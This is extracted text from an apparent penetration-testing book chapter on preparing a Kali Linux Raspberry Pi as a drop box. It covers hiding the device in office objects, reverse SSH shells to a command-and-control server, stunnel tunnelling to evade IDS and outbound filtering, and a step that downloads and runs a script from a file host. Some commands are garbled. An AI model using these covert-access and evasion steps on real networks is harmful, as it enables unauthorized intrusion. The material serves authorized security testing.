+The Raspberry Pi chipboard can be hidden in any official looking hardware such as 
+gutting a Cisco switch, hub, and so on, and placing the Raspberry Pi in one port. The 
+average user wouldn't question a network box that looks like it belongs there.
+In both these use cases, the major selling point is the Raspberry Pi's low cost, which 
+means that losing a system won't break the bank. Also, both the use cases showcase 
+the Raspberry Pi's value of being very mobile due to its small form. So, the Raspberry 
+Pi makes a great alternative to more expensive remote penetration toolsets such as 
+the ones offered by PWNIE Express  (we are not saying that the PWNIE Express 
+tools are not cool or desirable, but they will cost you a lot more than the Raspberry 
+Pi approach). Speaking of which, you can run a light version of the PWNIE Express 
+software on a Raspberry Pi as well, which is touched upon at the end of this book.
+A common reason to consider a Raspberry Pi is its flexibility of design, its software, 
+and its online community. There are thousands of websites dedicated to using the 
+Raspberry Pi for various types of use cases. So, if you run into a snag, you are most 
+likely to find a solution on Google. There are many options for operating systems 
+and pretty much everything seems to be open source. This makes requirements  
+for many design requests possible, such as the need to develop a large amount  
+of affordable systems for mobile classrooms.
+With a Raspberry Pi, the possibilities are endless. Regarding penetration testing, 
+Kali Linux offers pretty much everything you would need for a basic exercise. The 
+Kali Linux ARM is limited; however, you can always use apt-get  to download any 
+missing tools to meet your requirements for a penetration testing exercise as long 
+as the tool doesn't require massive computing power. We will be covering how to 
+download missing tools later in the book. So, go shell out $50 – $100 on a Raspberry 
+Pi and check out the online communities for more information on how you can take 
+your Raspberry Pi to the next level.
+Cloning the Raspberry Pi SD card
+It is recommended that you back up the original system software that came with 
+your Raspberry Pi prior to formatting it for a Kali Linux installation. Most Raspberry 
+Pi microSD cards come with a form of New Out of the Box Software  (NOOBS ) that 
+contains various operating system options from which you can select your primary 
+operating  system. If you already erased your microSD card, you can download the 
+NOOBS software from http://www.raspberrypi.org/downloads/ .
+www.it-ebooks.info
+
+Chapter 1[ 25 ]The cloning process for your SD card is very simple. Many Windows utilities such 
+as Win32 Disk Imager, which was covered earlier in the chapter, will make an exact 
+copy of the SD card. On a Mac, open a command prompt to identify your SD card 
+and type the diskutil list  command:
+In the preceding screenshot, my microSD card is /dev/disk1 . On your system, your 
+microSD card might be different; so, make sure to verify it. I can clone my card by 
+creating a disk image and saving it to the desktop. I will issue the following command:
+sudo dd if=/dev/disk1 of=~/Desktop/raspberrypi.dmg
+The following screenshot shows how I had to enter my password before the 
+command would execute:
+The process can take up to 30 minutes to clone an SD card. The speed of creating the 
+image will depend on the size and speed of the microSD card, the amount of data on 
+it, and the speed of your computer. In other words, be patient and let it copy.
+You may experience a permission denied error when you write the 
+image to the microSD card on OS X systems if you do not include the 
+sudo  command. If you use a variation of this command, make sure 
+the sudo  command applies to the entire command by using brackets 
+or you may still get this error.
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 26 ]Avoiding common problems
+One of the worst things is following the directions from a book and running into 
+an error during the process. We have imaged multiple Raspberry Pi systems and at 
+times experienced interesting and sometimes unpleasant behaviors. Here are some 
+problems that we ran into with their suggested workarounds: hopefully, this saves 
+you the time we spent banging our heads against the wall.
+• Power issues : We attempted to use small USB keychain power adapters that 
+had 5 V micro USB power to make our system very portable. Sometimes 
+these worked and sometimes they just showed that the Raspberry Pi 
+was powered but the system didn't boot. Make sure to test this because 
+sometimes you might find certain power adapters that don't work. Most 
+Raspberry Pi systems have lights on the side, showing red for power and 
+yellow for when it is operating properly. Check the manufacture website  
+of your model for more details.
+• MicroSD card reading issues : We heard that some people's microSD card 
+readers didn't identify the SD card once it was inserted into their systems. 
+Some Mac users claimed that they had to "blow into the SD reader hole", while 
+others found that they had to use an external reader to get the microSD card 
+to be recognized by the system. We recommend that you try another system. 
+If you are purchasing a microSD converter, make sure that the seller has listed 
+it as being Raspberry Pi microSD compatible. An external microSD reader 
+shouldn't cost more than $10. You can also follow the troubleshooting steps 
+that are available at http://elinux.org/R-Pi_Troubleshooting .
+If you find that your Raspberry Pi isn't working once you install an image 
+to the microSD card, verify whether the microSD card is inserted properly. 
+You should hear a slight click sound and it should pop in and out with the 
+help of a spring-like support. If it doesn't seem like it's sliding in properly, 
+the microSD card is probably upside down or it is the wrong type of card. If 
+you insert the microSD card properly and nothing happens once the system 
+is powered up, make sure you are using the correct power. The next problem 
+could be that the image wasn't installed properly. We found that some 
+people had their computers go to sleep mode during the dd process causing 
+only part of the Kali Linux image to copy over. Make sure that you verify 
+whether the image is copied over properly. Also, verify whether the image 
+that you downloaded is authentic. Offensive Security includes SHA1SUM, 
+which is used to verify whether your image has been tampered with. 
+Another issue could be the way you uncompressed the tar file. Make sure 
+that you use a valid method or the image file could become corrupted. If you 
+notice that the image is booting, watch the boot sequence for error messages 
+before the command prompt becomes available.
+www.it-ebooks.info
+
+Chapter 1[ 27 ]• Permission denied : Many Mac users found they didn't have the proper 
+permissions to run the dd command. This could be caused by a few things. 
+First, make sure that your microSD card or SD adapter doesn't have a 
+protection mode that is physically set. Next, make sure the reader and the 
+adapter are working properly. There have been reports that MAC users 
+have had to "blow into the SD reader" to clear the dust and get it to function 
+properly. Make sure that you use the sudo  command for the entire statement 
+as stated in the previous warnings. If the error continues, try an external 
+microSD reader as your current one may permit formatting but have 
+problems with the dd command.
+• Blank screen after startx : If you access the command line and type startx , 
+you should see the Raspberry Pi start the Kali Linux GUI. This may take a 
+few minutes to start depending on the size and speed of your Raspberry Pi as 
+well as what you have installed. If you have too many applications installed 
+that boggle your system, you may find that they overwhelm your Raspberry 
+Pi and freeze the GUI. As stated earlier, we highly recommend using a 
+Raspberry Pi for targeted penetration goals with limited functions rather 
+than loading it with more tools than necessary. There are many other systems 
+that are more powerful and should be considered over a Raspberry Pi if your 
+mission requires heavy processing power or a full-blown version of Kali 
+Linux. Also, we find that many applications run better using the command 
+line rather than launching them from the GUI. It is recommended to use Kali 
+Linux from the command line whenever possible.
+• Blank screen with working mouse after startx : We ran into this problem 
+after we accessed the Kali Linux GUI, ran apt-get update  from a terminal 
+window, and rebooted the system. On the second boot, we ran startx  and 
+found that the system seemed to boot properly; however, we were stuck with 
+a blank screen and a working mouse. If we had an open web browser prior 
+to shutting the system down, that browser would also appear; however, if 
+we had closed it, then we would have nothing but a mouse scrolling over a 
+blank screen. Sometimes our Raspberry Pi did this after the second startx  
+boot even if we didn't perform the update.
+This problem is caused by some files that don't update properly while 
+running apt-get update , and this causes problems with the display adapter 
+or just a general issue with the version of Kali Linux that you have installed. 
+There are two possible workarounds for this.
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 28 ]You most likely ran the apt-get update  and apt-get upgrade  commands 
+outside the X Windows environment. Therefore, you will need to reimage 
+and run your microSD card with a fresh version of Kali Linux, run apt-get 
+update  and then apt-get upgrade  within the X Windows environment,  
+and then sync and reboot your system. Follow these exact steps to avoid  
+the problem.
+The second workaround is to reimage your microSD card with a fresh 
+version of Kali Linux and not run the apt-get update  command. I know 
+this, but some people will spend two weeks troubleshooting when they could 
+have spent 30 minutes reimaging and moving on. Keep in mind that you 
+may run into the blank screen with operating mouse problem regardless, so 
+it is recommended to follow the update and upgrade procedure provided in 
+this book prior to using Kali Linux on your Raspberry Pi.
+• Kali Linux programs not found in GUI : We found that some versions of 
+the Kali Linux ARM image for Raspberry Pi would boot up properly, launch 
+the GUI once we entered startx , but would not display the Kali Linux tools 
+under the applications drop-down menu once the GUI was done loading. 
+This is a similar problem to the display issue explained earlier, which 
+means that it can be fixed by performing the apt-get update  and apt-get 
+upgrade  steps explained in this book that tell you what to do once you log 
+into the GUI for the first time. The update and upgrade process should install 
+and upgrade any corrupt files that are causing this problem. We once found 
+that after going through the recommended update and upgrade process, the 
+Kali Linux software appeared under the applications menu upon successfully 
+upgrading and rebooting the system.
+A great resource  for troubleshooting problems is http://elinux.org/
+R-Pi_Troubleshooting .
+www.it-ebooks.info
+
+Chapter 1[ 29 ]Summary
+In this chapter, we covered options for purchasing hardware and how to assemble 
+a Raspberry Pi. We discussed recommended hardware accessories such as microSD 
+cards and Wi-Fi adapters so that you are able to complete the steps given in  
+this book.
+Once we covered purchasing the proper hardware, we walked you through our 
+best practice procedure for installing Kali Linux on a Raspberry Pi. This included 
+the detailed procedure to format and upgrade Kali Linux as well as the common 
+problems that we ran into with possible remediation tips. At the end of this chapter, 
+you should have a fully working Kali Linux installation, updated software, and 
+everything running on your Raspberry Pi for a basic setup.
+In the next chapter, we will discuss the advantage of using a Raspberry Pi as a 
+penetration testing platform. We will cover how to optimize Kali Linux applications 
+for the Raspberry Pi as well as how to remotely control and manage your Raspberry 
+Pi as a Kali Linux attack platform.
+www.it-ebooks.info
+
+www.it-ebooks.info
+
+Preparing the Raspberry Pi
+The Raspberry Pi should be considered an underpowered platform for security 
+assessments. This is because it has been designed as a low-cost, portable computer 
+primarily targeting educationalists and hobbyists. This open platform may be limited 
+in computing power, but it does provide many powerful use cases that security 
+professionals can leverage for penetration testing and other service engagements. 
+The focus of this chapter will be on how to prepare a Raspberry Pi running Kali 
+Linux (or other platforms) for a penetration test.
+The following topics will be covered in this chapter:
+• Raspberry Pi use cases
+• The Command and Control server
+• Preparing for a penetration test
+• Overclocking
+• Setting up wireless cards
+• Setting up a 3G USB modem with Kali Linux
+• Setting up the SSH service
+• SSH default keys and management
+• Reverse shell through SSH
+• Stunnel
+• Wrapping up with an example
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 32 ]Raspberry Pi use cases
+Raspberry Pi is a common requirement for security professionals to gather 
+information  from remote sites in large distributed organizations. Many people 
+leverage commercial tools that specialize in vulnerability assessments for this 
+situation; however, you may not have access to such tools due to a limited budget or 
+vendor partnership requirements. An example of this situation is when the authors 
+of this book had to take part in a security assessment that included multiple locations 
+all over the world. For this project, it was not feasible to travel to every location 
+to deliver local penetration testing services. To overcome this, we sent Raspberry 
+Pi devices configured with Kali Linux to each location and remotely assessed the 
+network for vulnerabilities at a very affordable price. We will cover this engagement 
+example in more detail at the end of this chapter.
+Another valuable use case for a Raspberry Pi is when a security professional wants 
+to leave a device on-site for a long period of time. In the previous example, it was not 
+cost-effective to ship and leave a high-end system at each location. The Raspberry 
+Pi also has a stealth value using its small form factor through a portable device 
+with a modest power requirement over a larger, more powerful system. It is less 
+likely people will identify or tamper with a smaller, unknown black box such as a 
+Raspberry Pi hidden in a printer power cable versus a random laptop placed in an 
+inconspicuous area. For black-box  testing, the opportunity to conceal a Raspberry Pi 
+in common office supplies such as clocks, lamps, and printers is extremely useful. In 
+this chapter, we will discuss how to make this concept more effective by explaining 
+how you can use one or many Raspberry Pi systems to exploit remote locations from 
+a centralized attack standpoint.
+The following image shows a Raspberry Pi placed in a cat clock:
+www.it-ebooks.info
+
+Chapter 2[ 33 ]The Command and Control server
+As we have stated in other chapters, the Raspberry Pi is not a powerful machine. To 
+overcome this weakness, it is best practice to capture data in a controlled manner or 
+leverage offline computing when using Kali Linux on a Raspberry Pi. We found that 
+not doing so would either overwhelm the processors when using most of the attack 
+tools or quickly consume the limited local storage space when viewing captured 
+data. We will cover filtering captured data in Chapter 3 , Penetration Testing , under  
+the Tuning your network capture  section.
+When planning to remotely access multiple Raspberry Pi systems, we recommend 
+setting up a central Command and Control  (C&C ) server rather than accessing 
+each box individually. The C&C server should be a more powerful system such as a 
+traditional server so it can focus on CPU intensive tasks such as breaking passwords 
+through brute force. More importantly, tasks can also include using the C&C server 
+to perform the actual analysis and exploitation rather than locally on the Raspberry 
+Pi. An example is having a Phishing  attack send user traffic hitting the Raspberry Pi 
+to the C&C server to be analyzed for vulnerabilities and exploitation.
+Preparing for a penetration test
+The Kali Linux ARM image we covered in Chapter 1 , Raspberry Pi and Kali Linux 
+Basics , has already been optimized for a Raspberry Pi. We found however that it is 
+recommended to perform a few additional steps to ensure you are using Kali Linux 
+in the most stable mode to avoid crashing the Raspberry Pi. The steps are as follows:
+1. The first recommended step is to perform the OS updates as described in 
+detail in Chapter 1 , Raspberry Pi and Kali Linux Basics . We won't repeat the 
+steps here, so if you have not updated your OS, please go back to Chapter 1 , 
+Raspberry Pi and Kali Linux Basics , and follow the instructions.
+2. The next step you should perform is to properly identify your Raspberry 
+Pi. The Kali Linux image ships with a generic hostname. To change the 
+hostname, use the vi editor (although feel free to use any editor of your 
+choice; even if you are a fan of nano, we won't judge you much) with the  
+vi /etc/hostname  command as shown in the following screenshot:
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 34 ]The only thing in this file should be your hostname. You can see from my 
+example that I am changing my hostname from Kali  to RaspberryPi  as 
+shown in the following screenshot:
+3. You will also want to edit the /etc/hosts  file to modify the hostnames.  
+This can also be done using the vi editor. You want to confirm whether  
+your hostname is set correctly in your hosts  file. The following screenshot 
+shows how I changed my default hostname from Kali  to RaspberryPi .
+4. Make sure you save the files after making edits. Once saved, reboot the 
+system. You will notice the hostname has changed and will be reflected  
+in the new command prompt.
+Using common names such as HP Jetdirect as a means to 
+blend into the network could be beneficial in a black-box 
+testing environment.
+Overclocking
+Overclocking the  Raspberry Pi can improve the performance. The risk of doing this 
+can also greatly reduce the life of the hardware. Overclocking may require more 
+power from the Raspberry Pi, so if you are powering it from a weak power source, 
+overclocking could cause issues. We have had some problems resulting in what 
+appears to be corruption in microSD cards and operating systems when overclocking 
+the Raspberry Pi.
+Only overclock the Raspberry Pi if you can accept the risk 
+that you may permanently damage your system.
+www.it-ebooks.info
+
+Chapter 2[ 35 ]To overclock the Raspberry Pi, you can use the raspi-config application for advanced 
+hardware manipulation. Unfortunately, this application does not come with the  
+Kali Linux image and requires some configuration. Don't worry; we have made  
+the following steps pretty easy for you to follow. They are:
+1. From your Raspberry Pi command line, type:
+wget http://www.drchaos.com/wp-content/uploads/2014/09/raspberry_
+pi_overclock_files.zip
+You can  also use the official links to download the necessary files:
+• http://rageweb.info/2013/06/16/updated-
+raspi-config-in-kali/
+• http://rageweb.info/2013/11/07/bootconfig-
+txt-in-kali/
+The following screenshot shows the launch of the preceding command:
+2. You will need to unzip the files using the unzip  command as shown in the 
+following screenshot:
+3. Next, navigate to the directory you just unzipped and you will see a few files 
+in it as shown in the following screenshot:
+ 
+4. Type in the following commands in the terminal window:
+dpkg -i triggerhappy_0.3.4-2_armel.deb
+dpkg -i lua5.1_5.1.5-4_armel.deb
+dpkg -i raspi-config_20121028_all.deb
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 36 ]Now you will be able to launch the raspi-config utility. This utility will let you 
+control some very specific hardware features on the Raspberry Pi. You should  
+only change things if you absolutely know what you are doing, as stated in the 
+earlier warnings.
+We personally found no issue running our Raspberry Pi Model B+ at 1000 MHz. Your 
+mileage will vary, and don't be surprised if this will end up causing some permanent 
+damage to your Raspberry Pi. It also voids every warranty you might have.
+The following screenshot shows the Raspi-config  menu:
+Our specific configuration is as follows:
+• The arm_freq  is 1000
+• The gpu_freq  is 400
+• The sdram_freq  is 500
+• The over_voltage  is 6
+• The gpu_mem  is 128
+www.it-ebooks.info
+
+Chapter 2[ 37 ]You should issue the dmesg  command from the command line after changing your 
+hardware settings to check whether there are any error logs. We have seen most 
+configurations  change the GPU frequency rate to 500 MHz; however, we continuously 
+got errors on our system from the dmesg  output after a few days. We found we had 
+no issue when we dialed it back to 400 MHz.
+Setting up wireless cards
+When you purchase a Wi-Fi adapter for your Raspberry Pi, you want to make sure 
+it not only works with the Raspberry Pi, but also works with Kali Linux. Luckily, 
+almost every Wi-Fi adapter we used works with both the Raspberry Pi and Kali 
+Linux. In this book, we are using the CanaKit Wi-Fi dongle, as shown in the  
+following image:
+CanaKit makes an extremely popular Raspberry Pi kit that ships with this version 
+of the Wi-Fi adapter. You can also purchase an adapter separately. If you need to 
+purchase a separate card, make sure it is one that works with Debian Linux.
+A good  resource for compatible cards is http://elinux.org/
+RPi_USB_Wi-Fi_Adapters .
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 38 ]Once you connect your Wi-Fi adapter, you should first verify that the system shows 
+it is functioning properly. You can do this by issuing the iwconfig  command in a 
+terminal window as shown in the following screenshot:
+You should see a wlan0  interface representing your new wireless interface. The next 
+step is to enable the interface. We do this by issuing the ifconfig wlan0  command 
+followed by the up keyword as shown in the following screenshot:
+At this point, your wireless interface should be up and ready to scan the area for 
+wireless networks. This will allow us to test the wireless card to make sure it works, 
+as well as evaluate the wireless spectrum in the area. We will do this by issuing the 
+iwlist wlan0 scanning  command as shown in the following screenshot:
+It is important to remember most wireless networks you will 
+identify will be in the 2.4 GHz range. This is because most common 
+adapters are 2.4 GHz 802.11 b/g. You may need to change adapters 
+depending upon your requirements.
+www.it-ebooks.info
+
+Chapter 2[ 39 ]The iwlist wlan0 scanning  command will show the SSID and the MAC address 
+associated with the access points found in the area. You can see in the following  
+screenshot that we scanned a Wireless Lab  network and it has a MAC address  
+of 0E:18:1A:36:D6:22 . You can also see the Wi-Fi channel the AP is transmitting  
+on, which is Channel 36 .
+We have now set up wireless on our Raspberry Pi running Kali Linux.
+Setting up a 3G USB modem with  
+Kali Linux
+You can use 3G USB modem cards with Kali Linux and connect to your Raspberry Pi 
+over cellular  for stealthy remote access. Each card is manufactured a little differently, 
+and therefore the setup may vary based on the type of 3G card and service provider. 
+Our recommendation is using a MiFi  (short for Mobile Wi-Fi ) hotspot and 
+connecting Kali Linux through a Wi-Fi adapter; however, if you want to use  
+a 3G USB modem, make sure you verify it works with Debian.
+In our next example, we use the Huawei 3G USB modem connect card. This is  
+a 3G GSM card that works with most frequencies around the globe.
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 40 ]Here are the steps to set up this card:
+1. Open up a terminal window and type in the following command:
+wget http://www.ziddu.com/download/22764375/3gusbmodem.zip.html
+2. Unzip the file issuing the unzip  command.
+3. Make changes in the directory you just unzipped.
+4. Make the file an executable by typing in chmod +x 3gusbm* .
+5. Run the script by typing ./3gusbmodem –interactive .
+6. The script takes a few minutes to run, so be patient. Please select the Kernel  
+module when prompted.
+You will need to select your Access Point Name  (APN ) from your mobile provider. 
+You may also need to know the username and password for the APN login for your 
+mobile provider.
+Sometimes a username and password is not needed. If this is the 
+case, type in anything for the username and password. This should 
+be done even if a username and password is not required by your 
+mobile provider.
+Select OK when the process is completed. After a minute, you should see that you 
+have successfully connected to the 3G network.
+Setting up the SSH service
+The Secure Shell  (SSH ) gives you full access to the Kali Linux operating system on 
+a Raspberry Pi from a remote location. It is the most common way to manage Linux 
+systems using a command line. Since the Kali Linux GUI is not needed for most 
+penetration testing exercises, we recommend that you use SSH or command-line 
+utilities whenever possible. We found some installations of Kali Linux have SSH 
+enabled while others may need you to install the OpenSSH server.
+You should first verify whether the SSH service is installed. Type in the service 
+--status-all  command to check whether the SSH service is running. If you see + as 
+shown in the following screenshot, you are good to go. If you see a - sign, then you 
+will need to install the OpenSSH server.
+www.it-ebooks.info
+
+Chapter 2[ 41 ]
+To install the OpenSSH server, open a command-line terminal and type apt-get 
+install openssh-server  to install the SSH services. You will need to start  
+the SSH services by issuing the service ssh start  command as shown in the 
+following screenshot:
+Once you enable the SSH service, you should enable the SSH service to start running 
+after a reboot. To  do this, first remove the run level settings for SSH using the 
+update-rc.d -f ssh remove  command as shown in the following screenshot:
+Next, load SSH defaults  by using the update-rc.d -f ssh defaults  command as 
+shown in the following screenshot:
+Now you should have SSH permanently enabled on your Kali Linux system. You can 
+reboot the system at any time without needing to reconfigure the system to run SSH.
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 42 ]SSH default keys and management
+At this point, you have a Raspberry Pi ready for remote management using 
+SSH. This is good; however, the keys that are installed by default are extremely 
+predictable with every other default installation for OpenSSH. Although this 
+is optional, best practice is changing the default keys. After all, it would be 
+embarrassing if your penetration testing machine got hacked.
+Here are the steps to create a new SSH key for your Kali Linux system:
+Make sure you use a keyboard and console for the following 
+steps. Do not attempt to perform the following steps over an 
+existing SSH session.
+1. Move the default SSH keys by typing the following into the terminal or 
+command line:
+cd /etc/ssh/
+mkdir default_kali_keys
+mv ssh_host_* default_kali_keys/
+2. Generate a new key by using the following command and watching  
+the prompts:
+dpkg-reconfigure openssh-server
+Creating SSH2 RSA key; this may take some time ...
+Creating SSH2 DSA key; this may take some time ...
+Creating SSH2 ECDSA key; this may take some time ...
+[ ok ] Restarting OpenBSD Secure Shell server: sshd.
+The following screenshot shows the launch of the preceding commands:
+The final step is restarting the SSH services on your Kali Linux system using 
+the service ssh restart command.
+Reverse shell through SSH
+We have already covered the advantages of using a Raspberry Pi at remote locations. 
+The important thing to consider is how you should control the Raspberry Pi once 
+you have placed the Raspberry Pi on the target's network. The most obvious and 
+flexible way would be to SSH into Kali Linux.
+www.it-ebooks.info
+
+Chapter 2[ 43 ]Since Kali Linux is a fully featured Linux operating system, you can control the entire 
+environment through SSH; however, your incoming SSH connections may be blocked 
+by firewalls or other security solutions. Many organizations have security measures in 
+place to block incoming connections with the goal of preventing backdoors into their 
+network. In a white-box  assessment, you may be explicitly able to open up  a firewall 
+to permit SSH to your Raspberry Pi as shown in the following image. The bad news 
+is even if this is possible from a policy standpoint, it may be difficult to achieve when 
+dealing with multiple sites under multiple administrative controls. Reverse SSH is a 
+good alternative to manage a Raspberry Pi running Kali Linux.
+In a reverse connection, the client connects and initiates the connection to the server 
+instead of the server connecting to the client. In both cases, the server controls the 
+client. This is the same technique as many backdoor programs. For our purposes,  
+we will use this as a management utility.
+Many intrusion detection and prevention solutions can detect SSH 
+based on the network traffic looking different regardless of the port. 
+For example, using port 443 would still look different from common 
+HTTPS traffic.
+We will use the R switch in the ssh command to create a reverse connection to the 
+listener. A listener is the device listening to accept reverse SSH connections. In our 
+case, the C&C server is the listener. The syntax for the commands used on the remote 
+host (Raspberry Pi) is ssh -R [bind_address:]port:host:hostport .
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 44 ]The R switch defines the port that the remote side will connect over or how it will 
+initiate the connection. In other words, we need to pick a port that our remote 
+Raspberry Pi will be able to connect on. Most organizations do not have strict 
+outbound filtering policies, making this approach more effective than a standard 
+SSH connection. We find common ports open are TCP ports 22, 80, 443, or 53, 
+meaning clients may be able to freely connect to the outside world using these ports.
+Strict outbound protocol inspection devices such as next-generation 
+firewalls, next-generation IPS (short for Intrusion Prevention System ), 
+and advanced proxy servers may block these types of connections.
+The hostport  is the port on your Raspberry Pi that has a service setup for listening. 
+In our case, we are running an SSH server so the hostport by default will be 22. 
+You could change the default port to be more stealthy or leverage stunnel, which is 
+covered next in this chapter. To summarize, the port will be the TCP port and the 
+server is accepting incoming connections from the Raspberry Pi. The hostport is the 
+port the server is running the SSH service.
+On our Raspberry Pi example, we will enter the following command:
+ssh -fN -R 7000:localhost:22 username@ip-address-of-your-command-and-
+control-server
+ssh -fN -R 7000:localhost:22 root@192.168.162.133
+This assumes port 7000  is allowed out from the network our Raspberry Pi is 
+connected on. If that does not work, try different ports. Most organizations will  
+allow outbound port 443 as shown in the following image:
+www.it-ebooks.info
+
+Chapter 2[ 45 ]To try again with a different port on your Raspberry Pi, use the following command:
+ssh -fN -R 443:localhost:22 root@192.168.162.133
+On your C&C central server, open up a command-line terminal and enter the 
+following command:
+ssh root@localhost -p 443
+You will be prompted for the root password of your Kali Linux Raspberry Pi. You 
+can see from the last command-line example that the command prompt has changed. 
+We are now on our remote server and have full control of our Raspberry Pi as shown 
+in the following image:
+You will need to make sure the OpenSSH server is installed and running 
+or this process will fail. You will most likely see the failure by a connection 
+refused error message. It is also important that you have modified the 
+startup variables so your Raspberry Pi has SSH running after a reboot.
+This technique is called reverse shell tunneling. Pick any port as your source port, 
+such as port 53, which is the same port as DNS, or port 80 to use the same port as 
+HTTP. It is important to keep in mind that changing the port numbers does not 
+necessarily mean you are changing the underlining protocols.
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 46 ]Stunnel
+Many administrators will have detection technologies such as IDS/IPS to detect  
+and prevent open VPN connections. One method to get around this is levering 
+stunnel. Stunnel creates secure communication between a TCP client and server by 
+hiding inside another SSL envelope. This is done by acting like an SSL encryption 
+wrapper between the remote client and server using industry-standard crypto 
+libraries such as OpenSSL. What makes stunnel cool is it adds SSL functionality to 
+commonly used daemons like POP2, POP3, and IMAP servers without any changes 
+in the program's code.
+To use stunnel, you first need to download the code using the apt-get install 
+stunnel4 –y  command as shown in the following screenshot:
+You may get a message that the latest version of stunnel is already installed.
+You will need to create a file called stunnel.conf  inside the /etc/stunnel/  
+directory. You can use your favorite text editor such as nano or vi to create the file.
+The following will be configured and entered into the stunnel.conf  file. Note that 
+you can change the ports to something that better suits you:
+client = no
+[squid]
+accept = 8888
+connect = 127.0.0.1:3128
+cert = /etc/stunnel/stunnel.pem
+The following screenshot shows the configurations in the stunnel.conf  file:
+Next, you need to generate your private key using the following commands:
+cd /etc/stunnel/
+openssl genrsa -out key.pem 2048
+openssl req -new -x509 -key key.pem -out cert.pem -days 1095
+www.it-ebooks.info
+
+Chapter 2[ 47 ]cat key.pem cert.pem >> /etc/stunnel/stunnel.pem
+sudo bash
+cat server.key > server.pem && cat server.crt >> server.pem
+chmod 400 /etc/stunnel/server.pem
+Once installed, you need to configure stunnel using the sudo nano /etc/default/
+stunnel4  command.
+This opens the .conf  file. Change enable = 0  to enable = 1 . Next, open a file 
+called stunnel.conf  and add the following configuration to the file:
+sudo nano /etc/stunnel/stunnel.conf
+sslVersion = all
+options = NO_SSLv2
+cert = /etc/stunnel/server.pem
+pid = /var/run/stunnel.pid
+output = /var/log/stunnel
+[openvpn]
+client = no
+accept = 993
+connect = 34567
+Then, add a firewall setting on the Raspberry Pi by creating the firewall.sh  file 
+using the following commands:
+Sudo nano /usr/local/bin/firewall.sh
+Iptables –A INPUT –p tcp –dport 993 –j ACCEPT
+The next step is to restart the stunnel services by issuing the following command:
+/etc/init.d/stunnel4 restart
+The final step is installing the Squid proxy on your Kali Linux Raspberry Pi by 
+issuing the apt-get install squid3 –y  command.
+Installing a Stunnel client
+Now we need to install a stunnel client. We can do this by downloading the 
+Windows stunnel client application available at https://www.stunnel.org/
+downloads.html .
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 48 ]The following image shows a stunnel-installer executable file icon:
+When you have completed the install, open the stunnel install directory on Windows 
+(it is usually located at C:\Program Files\stunnel ).
+Copy the stunnel.pem  certificate you created on Kali to your Windows client inside 
+the same directory.
+You should then open the stunnel.conf  file and replace the contents with the 
+following (please adjust any port settings you might have changed from our example):
+cert = stunnel.pem
+client = yes
+[squid]
+accept = 127.0.0.1:8080
+connect = [Server's Public IP]:8888
+Save and close the file. Next, run the stunnel.exe  application. You will see the 
+configuration page displayed:
+www.it-ebooks.info
+
+Chapter 2[ 49 ]Now you can connect to your Raspberry Pi securely using the IP address  and Port  
+specified in the configuration's accept  parameter you defined:
+Wrapping it up with an example
+Going back to our example from the beginning of the chapter, let's see how the topics 
+covered in this chapter would apply to the real world. To recap on the situation, we 
+had a customer with multiple international locations requiring on-site penetration 
+testing services at an affordable price. To meet this challenge, we put together a 
+Raspberry Pi hosting Kali Linux kit that cost us under a hundred dollars to construct 
+per location. We sent a kit to each location and had a local person connect the 
+Raspberry Pi to the local network. The method of connection and the tools that  
+we ran will be covered in the next chapter.
+www.it-ebooks.info
+
+Preparing the Raspberry Pi[ 50 ]Each local site was not aware of our service engagement, so we had to work around 
+existing security such as firewalls configured to block outbound connections. To do 
+this, we set up stunnel over a mail port and accessed all Raspberry Pi kits from a 
+MacBook running Kali Linux. This gave us a centralized command and control point 
+for each Raspberry Pi and a method to offload anything requiring heavy processes.  
+At this point, we started launching various attacks from each Raspberry Pi from  
+our home office in USA.
+The total cost of this approach versus charging for travel and on-site services, which 
+was night and day based, was as per initial budget expectations. The customer 
+was happy to pay a few hundred dollars for hardware cost per site since we had a 
+markup for time for construction and shipping. Outside of that, we charged for our 
+services and that was it, making the overall project affordable and successful.
+Summary
+In this chapter, you learned how to customize a Raspberry Pi running Kali Linux for 
+penetration testing environments. We covered best practices to tune the performance 
+and to limit the use of GUI tools using command-line configurations.
+One major point covered was how to set up a remote C&C server to offload all 
+possible tasks from the Raspberry Pi as well as exporting data (exporting data is 
+covered in Chapter 3 , Penetration Testing ). This included establishing communication 
+between the Raspberry Pi and the C&C server. We did this using SSH, HTTPS, and 
+other types of tunnels. We also covered how to deal with placing a Raspberry Pi 
+behind a firewall and still being able to manage it using reverse shell tunneling  
+back to the C&C server.
+After this chapter, you should be ready to start your penetration test. In the next 
+chapter, we will cover how to perform penetration testing exercises from the 
+Raspberry Pi hosting Kali Linux.
+www.it-ebooks.info
+
+Penetration Testing
+Until this point, we have covered how to build a Raspberry Pi, install Kali Linux, 
+and prepare your Raspberry Pi for a penetration test through various forms of 
+remote access techniques. Now you are ready to learn how to use the Raspberry 
+Pi to capture data on a target network. This chapter will provide you with various 
+LAN- and wireless-based attack scenarios, using tools found in Kali Linux that are 
+optimized for a Raspberry Pi or tools that you can download using the apt-get  
+command. There are other tools that are available in Kali Linux as well as online; 
+however, we will focus on applications that we have found to function properly  
+on a Raspberry Pi.
+The following topics will be covered in this chapter:
+• Network scanning
+• Nmap
+• Wireless security
+• Cracking WPA/WPA2
+• Creating wordlists
+• Capturing traffic on the network
+• Getting data to the Pi
+• Tuning your network capture
+• Scripting tcpdump for future access
+• Wireshark and TShark
+• Beating HTTPS with SSLstrip
+www.it-ebooks.info
+
+Penetration Testing[ 52 ]The Raspberry Pi has limited performance capabilities due to its size and 
+processing power. It is highly recommended that you test the following 
+techniques in a lab prior to using a Raspberry Pi for a live penetration test.
+Network scanning
+Network reconnaissance is typically time-consuming, yet it is the most important 
+step when performing a penetration test. The more you know about your target, the 
+more likely it is that you will find the fastest and easiest path to success. The best 
+practice is starting with reconnaissance methods that do not require you to interact 
+with your target; however, you will need to make contact eventually. Upon making 
+contact, you will need to identify any open ports on a target system as well as map 
+out the environment to which it's connected. Once you breach a system, typically 
